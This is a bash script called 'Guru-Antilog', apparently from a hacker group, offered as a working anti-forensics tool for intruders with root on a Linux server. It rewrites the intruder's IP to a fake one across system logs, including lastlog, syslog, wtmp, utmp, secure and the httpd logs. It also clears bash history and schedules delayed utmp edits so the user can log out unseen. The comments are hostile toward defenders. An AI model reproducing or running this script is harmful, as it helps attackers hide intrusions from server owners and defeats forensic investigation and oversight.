#!/bin/bash
#
# Guru-Antilog V 0.1
#
# usage : to Exchanging your IP with fake IP y0 choose it
#
# and to clear your last command's and clear logout history  
#
# Remember that...
#
# y0 have one minute to logout from b0x no more.. so be carefull
# 
# Fuck the whitehats
# 
clear
echo "--------------------------------------------------------------------------------------------------------------------"
echo "                     Guru-Antilog c0ded  By [ sAFA7_eLNeT ] (SecurityGurus.NeT) - SecurityGurus[AT]irc.dal.net:6667 "
echo "  Greetz g0es to : Acid-WarZ,rOCk-MaStEr,j7a,MedoZero,Spiderz,and all SecurityGurus.NeT PPL and all 1--5.com folks "
echo "--------------------------------------------------------------------------------------------------------------------"
if [ "$UID" = "0" ];then
echo " h3re w3 g0 "
else
echo " `whoami` y0 must be login by root"
fi
echo -n " What's the ip y0 want to spoof it ?  "
read word
word=$word
echo -n " What's the Fake ip y0 want  using it ? "
read fake
fake=$fake
r0x="yes"
if [ ! -f /var/log/lastlog ]; then
r0x="no"
echo " i can't find lastlog"
fi
if [ "$r0x" = "yes" ]; then
echo " Editing lastlog"
sed "s/$word/$fake/g" /var/log/lastlog > /var/log/lastlog.new
mv /var/log/lastlog.new /var/log/lastlog
fi
syslog="yes"
if [ ! -f /var/log/syslog ]; then
echo " i can't find syslog"
 syslog="no"
fi
if [ "$syslog" = "yes" ]; then
echo " Editing syslog"
sed "s/$word/$fake/g" /var/log/syslog > /var/log/syslog.new
mv /var/log/syslog.new /var/log/syslog
fi
mess="yes"
if [ ! -f /var/log/messages ]; then
 echo " i can't find message "
mess="no"
fi
if [ "$mess" = "yes" ]; then
echo " Editing message"
sed "s/$word/$fake/g" /var/log/messages > /var/log/messages.new
mv /var/log/messages.new /var/log/messages
fi
http="yes"
if [ ! -f /var/log/httpd/access_log ]; then
 echo " i can't find access_log "
http="no"
fi
if [ "$http" = "yes" ]; then
 echo " Editing access_log"
sed "s/$word/$fake/g" /var/log/httpd/access_log > /var/log/httpd/access_log.new
mv /var/log/httpd/access_log.new /var/log/httpd/access_log
fi
httpd="yes"
if [ ! -f /var/log/httpd/error_log ]; then
 echo " i can't find error_log "
httpd="no"
fi
if [ "$httpd" = "yes" ]; then
echo " Editing error_log "
sed "s/$word/$fake/g" /var/log/httpd/error_log > /var/log/httpd/error_log.new
mv /var/log/httpd/error_log.new /var/log/httpd/error_log
fi
wtmp="yes"
if [ ! -f /var/log/wtmp ]; then
 echo " i can't find wtmp "
wtmp="no"
fi
if [ "$wtmp" = "yes" ]; then
echo " Editing wtmp "
sed "s/$word/$fake/g" /var/log/wtmp > /var/log/wtmp.new
mv /var/log/wtmp.new /var/log/wtmp
fi
secure="yes"
if [ ! -f /var/log/secure ]; then
echo " i can't find secure "
secure="no"
fi
if [ "$secure" = "yes" ]; then
echo " Editing secure "
sed "s/$word/$fake/g" /var/log/secure > /var/log/secure.new
mv /var/log/secure.new /var/log/secure
fi
xferlog="yes"
if [ ! -f /var/log/xferlog ]; then
echo " i can't find xferlog "
xferlog="no"
fi
if [ "$xferlog" = "yes" ]; then
echo " Editing xferlog "
sed "s/$word/$fake/g" /var/log/xferlog > /var/log/xferlog.new
mv /var/log/xferlog.new /var/log/xferlog
fi
utmp="yes"
if [ ! -f /var/run/utmp ]; then
echo " i can't find utmp "
utmp="no"
fi
if [ "$utmp" = "yes" ]; then
echo " Editing utmp "
sed "s/$word/$fake/g" /var/run/utmp > /var/run/utmp.new
mv /var/run/utmp.new /var/run/utmp
fi
echo -n " if y0 want to delete the last commands  type (yes) if y0 don't type (no) 0r anything    "
read command
if [ "$command" = "yes" ]; then
echo "##Now the last commands y0 put it will go to hell ^_^ ##"
echo -n > ~/.bash_history
history -c
echo -n " y0 have one minute to exit from server..go0d luck "
/etc/init.d/atd start
echo "sed 's/$word/$fake/g' /var/run/utmp > /var/run/utmp.new" | at now + 1 minute
echo "mv /var/run/utmp.new /var/run/utmp" | at now + 2 minute
echo " Guru-Antilog Ended  work... Cheers ! "
exit 0
else
echo -n " y0 have one minute to exit from server..go0d luck "
/etc/init.d/atd start
echo "sed 's/$word/$fake/g' /var/run/utmp > /var/run/utmp.new" | at now + 1 minute
echo "mv /var/run/utmp.new /var/run/utmp" | at now + 2 minute
echo " Guru-Antilog Ended  work... Cheers ! "
exit 0
fi
